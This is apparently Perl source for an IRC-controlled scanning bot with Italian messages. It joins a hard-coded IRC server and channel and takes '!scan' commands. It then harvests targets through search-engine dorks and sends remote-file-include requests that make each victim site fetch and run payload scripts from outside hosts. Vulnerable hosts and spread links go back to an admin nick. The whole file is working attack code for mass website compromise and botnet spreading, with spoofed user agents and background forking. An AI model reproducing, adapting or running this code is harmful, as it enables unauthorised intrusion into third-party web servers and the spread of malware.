use HTTP::Request;
use LWP::UserAgent;
use IO::Socket::INET;


my $cmd = "http://www.wauze.de//language/lang_english/RuLeZ/me.txt?";
my $cmdprint = "http://www.wauze.de//language/lang_english/r.txt??";
my $nick = "UnIx|".(int(rand(99)));
my $ident = "xpl";
my $chan = "#r4k3t";
my $server = "211.21.73.10";
my $http = "Googlebot";
my $port = 6667;
my $sock;
my $proxy = 30;
my $admin = "SuPrEmO";
my $stringa = "!scan";
my $spread = "http://www.malteser-paderborn.de//contenido/includes/c.txt?";
my @User_Agent = &Agent();
my $pid = fork();

if($pid==0){
	&irc($nick,$ident,$chan,$server,$port);
}else{
	exit(0);
}

sub irc(){
	my($nick,$ident,$chan,$server,$port)=@_;
	$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$server",PeerPort=>$port);
	$sock->autoflush(1);
	print $sock "NICK ".$nick."\r\n";
	print $sock "USER ".$ident." 8 *  : By SISTEM\r\n";
	print $sock "JOIN ".$chan."\r\n";
	while( $cmdline = <$sock> ){
		if ( $cmdline =~ /PRIVMSG $chan :$stringa\s+(.*?)\s+(.*)/ ) {
			if(fork() == 0){
				my($bug,$dork)=($1,$2);
				&scan($bug,$dork);
				exit(0);
			}
		}
		if ($cmdline =~ /PRIVMSG $chan :!info/){
			&privmsg($chan,"9[10Per scannare9]: 15$stringa bug dork");
		}
                if ($cmdline =~ /PRIVMSG $chan :!outbye/){
                         exit(0);
		}
		if($cmdline =~ /^PING \:(.*)/){
			print $sock "PONG :$1";
		}
	}
}

sub scan(){
	my($bug,$dork)=@_;
	my $contatore = 0;
	&privmsg($chan,"9[10Scansione Per9]: 5Bug:".$bug);
	&privmsg($chan,"9[10Scansione Per9]: 6Dork:".$dork);
	my @proc;
	$proc[9] = fork();
	if($proc[9] == 0){
		&privmsg($chan,"9[10Scansione Di9]: 6Google4:".scalar(&Google($dork)));
		exit;
	}
	$proc[1] = fork();
	if($proc[1] == 0){
		&privmsg($chan,"9[10Scansione Di9]: 6Yahoo4:".scalar(&Yahoo($dork)));
		exit;
	}
	$proc[2] = fork();
	if($proc[2] == 0){
		&privmsg($chan,"9[10Scansione Di9]: 6Altavista4:".scalar(&Altavista($dork)));
		exit;
	}
	$proc[3] = fork();
	if($proc[3] == 0){
		&privmsg($chan,"9[10Scansione Di9]: 6Lycos4:".scalar(&Gigablast($dork)));
		exit;
	}
	$proc[4] = fork();
	if($proc[4] == 0){
		&privmsg($chan,"9[10Scansione Di9]: 6Msn4:".scalar(&Msn($dork)));
		exit;
	}
	$proc[5] = fork();
	if($proc[5] == 0){
		&privmsg($chan,"9[10Scansione Di9]: 6Ilse.Nl4:".scalar(&Ask($dork)));
		exit;
	}
	$proc[6] = fork();
	if($proc[6] == 0){
		&privmsg($chan,"9[10Scansione Di9]: 6Tiscali4:".scalar(&Fireball($dork)));
		exit;
	}
	$proc[7] = fork();
	if($proc[7] == 0){
		&privmsg($chan,"9[10Scansione Di9]: 6Alltheweb4:".scalar(&Alltheweb($dork)));
		exit;
	}
	$proc[8] = fork();
	if($proc[8] == 0){
		&privmsg($chan,"9[10Scansione Di9]: 6Aol4:".scalar(&Aol($dork)));
		exit;
	}
	waitpid($proc[9],0);
	waitpid($proc[1],0);
	waitpid($proc[2],0);
	waitpid($proc[3],0);
	waitpid($proc[4],0);
	waitpid($proc[5],0);
	waitpid($proc[6],0);
	waitpid($proc[7],0);
	waitpid($proc[8],0);
	my @links = &GetLink();
	my @forks;
	my $forked++;
	&privmsg($chan,"9[10Ricerca9]: 15Totals Results:".scalar(@links));
	my @uni = &Unici(@links);
	&privmsg($chan,"9[10Ricerca9]: 15Cleaned:".scalar(@uni));
	&Remove();
	my $testx = scalar(@uni);
	my $startx = 0;
	foreach my $sito (@uni){
		$contatore++;
		my $link = "http://" . $sito . $bug . $cmd . "?";
		my $link = "http://" . $sito . $bug . $spread . "?";
		if($contatore %$proxy == 0){
			my $start = 0;
			foreach my $f(@forks){
				waitpid($f,0);
				$forks[$start--];
				$start++;
			}
			$startx = 0;
		}
		$forks[$startx]=fork();
		if($forks[$startx] == 0){
			my $htmlsito = &Query($link,"3");
			if($htmlsite =~ /JaheeM/ && $htmlsite =~ /uid=/){
				&privmsg($chan,"9[4SAFE OFF9]: 8"."http://" . $sito . $bug . "3" . $cmdprint . "?");
				&privmsg($admin,"9[4SAFE OFF9]: 8"."http://" . $sito . $bug . "3" . $cmdprint . "?");
				&privmsg($admin,"9[4SPreAD9]: 8"."http://" . $sito . $bug . "4" . $spread . "?");

			}
			elsif($htmlsito =~ /JaheeM/){
				&privmsg($chan,"9[11SAFE ON9]: 7"."http://" . $sito . $bug . "7" . $cmdprint . "?");
				&privmsg($admin,"9[11SAFE ON9]: 7"."http://" . $sito . $bug . "7" . $cmdprint . "?");
				&privmsg($admin,"9[11SpreaD9]: 7"."http://" . $sito . $bug . "4" . $spread . "?");

			}
			exit(0);
		}
		if($contatore %200 == 0){
			&privmsg($chan,"9[10Ricerca9]: 7Scannati ".$contatore." di ".$testx);
		}
		$startx++;
	}
	my $start = 0;
	foreach my $f(@forks){
		waitpid($f,0);
		$forks[$start--];
		$start++;
	}
	&privmsg($chan,"9[10Ricerca4]:".$bug .$dork);
	&privmsg($chan,"9[10Ricerca4]: 7Fine.");
}

sub privmsg(){
	my ($cha,$cosi)=@_;
	print $sock "PRIVMSG ".$cha." :".$cosi."\r\n";
}

sub Google(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=100;
	my $max=100*10;
	my @dom = &GoogleDomains();
	my $file = "google.txt";
	my $html;
	my @result;
	foreach my $dominio (@dom){
		for($start=0;$start < $max; $start += $num){
			$html.=&Query("http://www.google.".$dominio."/search?q=".$dork."&num=100&hl=de&cr=countryDE&start=".$start."&sa=N");
		}
	}
	while($html =~ m/<h2 class=r><a href=\"http:\/\/(.+?)\"/g){
		$1 =~ /google/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub Yahoo(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=100;
	my $max=100*10;
	my $file = "yahoo.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://search.yahooapis.com/WebSearchService/V1/webSearch?appid=SiteSearch&query=".$dork."&results=".$num."&start=".$start);
	}
	while($html =~ m/<Url>http:\/\/(.+?)\<\/Url>/g){
		$1 =~ /yahoo/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub Altavista(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=100;
	my $max=100*10;
	my $file = "altavista.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://de.altavista.com/web/results?itag=ody&pg=aq&aqmode=s&aqa=".$dork."&aqp=&aqo=&aqn=&kgs=1&kls=1&filetype=&rc=dmn&swd=&lh=&nbq=50&stq=".$start);
	}
	while($html =~ m/<span class=ngrn>(.+?)\ <\/span>/g){
		if($1 !~ /yahoo/ && $1 !~ /Altavista/){
			push(@result,&Links($1,$file));
		}
	}
	return(@result);
}

sub Gigablast(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $max=99;
	my $file = "gigablast.txt";
	my $html;
	my @result;
      for($start=1;$start < $max; $start += 1){
	$html.=&Query("http://suche.lycos.de/cgi-bin/pursuit?pag=".$start."&query=".$dork."&SITE=de&cat=loc&enc=utf-8");
}
	while($html =~ m/href=\"(.+?)\"/g){
		push(@result,&Links($1,$file));
	}
	return(@result);
}

sub Msn(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=10;
	my $max=100*10;
	my $file = "msn.txt";
	my $html;
	my @result;
	for($start=1;$start < $max; $start += $num){
		$html.=&Query("http://search.live.com/results.aspx?q=".$dork."&lf=1&rf=1&first=".$start);
	}
	while($html =~ m/<a href=\"http:\/\/(.+?)\"/g){
		$1 =~ /msn/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub Ask(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=1;
	my $max=100;
	my $file = "ask.txt";
	my $html;
	my @result;
	for($start=1;$start < $max; $start += $num){
		$html.=&Query("http://search.ilse.nl/web?rid=PREV&pagnum=".$start."&search_for=".$dork);
	}
	while($html =~ m/\">(.+?)<\/a>/g){
		$1 =~ /ask/ || push(@result,&Links($3,$file));
	}
	return(@result);
}

sub Fireball(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=1;
	my $max=99;
	my $file = "fireball.txt";
	my $html;
	my @result;
	for($start=1;$start < $max; $start += $num){
		$html.=&Query("http://search-dyn.tiscali.de/search.php?key=".$dork."&collection=de&tiscalitype=web&hits=10&language=de&maxCount=&collapse=on&spell=suggest&pg=".$start."&offset=".(($start-1)*10)."&xargs=");
	}
	while($html =~ m/onmouseover=\"window.status=\'http:\/\/(.+?)\'/g){
		$1 =~ /tiscali/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub Alltheweb(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=100;
	my $max=100*10;
	my $file = "alltheweb.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://www.alltheweb.com/search?advanced=1&cat=web&type=all&hits=".$num."&ocjp=1&q=".$dork."&o=".$start);
	}
	while($html =~ m/<span class=\"resURL\">http:\/\/(.+?)\ /g){
		$1 =~ /alltheweb/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub Aol(){
	my($dork)=@_;
	$dork=&Key($dork);
	my $start;
	my $num=1;
	my $max=100;
	my $file = "aol.txt";
	my $html;
	my @result;
	for($start=0;$start < $max; $start += $num){
		$html.=&Query("http://suche.aol.de/aol/search?query=".$dork."&page=".$start."&nt=SG2&langRestrict=2&q=".$dork."&rp=lang_de");
	}
	while($html =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
		$1 =~ /aol/ || push(@result,&Links($1,$file));
	}
	return(@result);
}

sub Query(){
	my($link,$timeout)=@_;
	my $req=HTTP::Request->new(GET=>$link);
	my $ua=LWP::UserAgent->new();
	$ua->agent($User_Agent[rand(scalar(@User_Agent))]);
	$ua->timeout($timeout);
	my $response=$ua->request($req);
	return $response->content;
}

sub Key(){
	my $chiave=$_[0];
	$chiave =~ s/ /\+/g;
	$chiave =~ s/:/\%3A/g;
	$chiave =~ s/\//\%2F/g;
	$chiave =~ s/&/\%26/g;
	$chiave =~ s/\"/\%22/g;
	$chiave =~ s/\\/\%5C/g;
	$chiave =~ s/,/\%2C/g;
	return $chiave;
}

sub GetLink(){
	my @file = ("google.txt","yahoo.txt","altavista.txt","gigablast.txt","msn.txt","ask.txt","fireball.txt","alltheweb.txt","aol.txt");
	my $link;
	my @total;
	foreach my $n (@file){
		open(F,'<',$n);
		while($link = <F>){
			$link=~s/[\r\n]//g;
			push(@total,$link);
		}
		close(F);
	}
	return(@total);
}

sub Remove(){
	my @file = ("google.txt","yahoo.txt","altavista.txt","gigablast.txt","msn.txt","ask.txt","fireball.txt","alltheweb.txt","aol.txt");
	foreach my $n (@file){
		system("rm -rf ".$n);
	}
}

sub Links(){
	my ($link,$file_print) = @_;
	my $host = $link;
	my $host_dir = $host;
	my @links;
	$host_dir=~s/(.*)\/[^\/]*$/\1/;
	$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
	$host_dir=&End($host_dir);
	$host=&End($host);
	$link=&End($host);
	push(@links,$link,$host,$host_dir);
	open($file,'>>',$file_print);
	print $file "$link\n$host_dir\n$host\n";
	close($file);
	return @links;
}

sub End(){
	$stringa=$_[0];
	$stringa.="/";
	$stringa=~s/\/\//\//;
	while($stringa=~/\/\//){
		$stringa=~s/\/\//\//;
	}
	return($stringa);
}

sub Unici{
	my @unici = ();
	my %visti = ();
	foreach my $elemento ( @_ ){
		next if $visti{ $elemento }++;
		push @unici, $elemento;
	}
	return @unici;
}

sub Agent(){
	my @ret = (
	"Microsoft Internet Explorer/4.0b1 (Windows 95)",
	"Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)",
	"Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
	"Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)",
	"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Win32)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
	"Microsoft Pocket Internet Explorer/0.6",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)",
	"MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)",
	"Advanced Browser (http://www.avantbrowser.com)",
	"Avant Browser (http://www.avantbrowser.com)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)",
	"Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)",
	"Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)",
	"Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511",
	"Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox",
	"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
	"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b",
	"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0",
	"Mozilla/3.0 (OS/2; U)",
	"Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)",
	"Mozilla/4.61 (Macintosh; I; PPC)",
	"Mozilla/4.61 [en] (OS/2; U)",
	"Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)",
	"Mozilla/4.8 [en] (Windows NT 5.0; U)" );
return(@ret);
}
sub GoogleDomains(){
	my @dom = ("at","ch","de","fr","gr","nl","pt","co.uk","be");
return(@dom);
}



